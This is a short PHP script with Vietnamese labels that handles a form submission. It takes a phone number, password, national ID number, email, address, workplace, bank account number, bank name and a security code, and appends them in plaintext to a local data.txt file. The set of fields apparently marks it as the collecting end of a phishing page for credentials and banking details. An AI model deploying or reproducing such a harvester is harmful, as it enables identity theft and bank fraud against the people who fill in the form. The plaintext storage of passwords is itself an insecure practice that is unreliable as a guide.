<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $data = [
        "SĐT" => $_POST["sdt"] ?? '',
        "Mật khẩu" => $_POST["password"] ?? '',
        "CCCD" => $_POST["cccd"] ?? '',
        "Email" => $_POST["email"] ?? '',
        "Địa chỉ" => $_POST["diachi"] ?? '',
        "Nghề nghiệp" => $_POST["nghenghiep"] ?? '',
        "Nơi làm việc" => $_POST["noilamviec"] ?? '',
        "Số TK ngân hàng" => $_POST["stk"] ?? '',
        "Tên ngân hàng" => $_POST["nganhang"] ?? '',
        "Mã bảo mật" => $_POST["capchar"] ?? '',
        "Thời gian gửi" => date("Y-m-d H:i:s"),
    ];

    $entry = "-----------------------------\n";
    foreach ($data as $key => $value) {
        $entry .= "$key: $value\n";
    }

    file_put_contents("data.txt", $entry, FILE_APPEND);

    echo "<h3>Thông tin đã được ghi lại thành công!</h3>";
    echo '<p><a href="info.html">Quay lại trang nhập</a></p>';
} else {
    echo "Phương thức gửi không hợp lệ.";
}
?>
